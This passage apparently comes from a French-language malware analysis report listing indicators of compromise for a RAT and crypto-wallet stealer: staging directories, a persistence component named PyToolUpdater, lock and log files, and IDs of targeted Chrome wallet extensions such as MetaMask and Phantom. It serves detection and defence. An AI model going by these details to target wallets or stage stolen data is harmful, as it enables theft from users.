| `~/.n2/` | Linux/macOS | Répertoire de travail RAT (flist, bow) |
| `~/.n3/` | Linux/macOS | Répertoire de staging stage 1 JS stealer (exfiltration wallets crypto) |
| `/tmp/PyToolUpdater.pid` | macOS | PID file anti-doublon du bootstrap |
| `/tmp/PyToolUpdater.log` | macOS | Log stderr du processus persisté |
| `.poc2` | Tous | Lock file anti-doublon Python comms (répertoire courant) |
| `PyToolUpdater` | Tous | Nom du composant de persistance |

### Extensions Chrome ciblées (stage 1)

| Extension ID | Wallet | Confirmation |
|---|---|---|
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask | Certaine |
| `fhbohimaelbohpjbbldcngcnapndodjp` | Binance Chain Wallet | Certaine |
| `bfnaelmomeimhlpmgjnjophhpkkoljpa` | Phantom (Solana) | Certaine |
| 19 autres IDs (voir section 5.3) | Wallets crypto non identifiés | Haute probabilité |
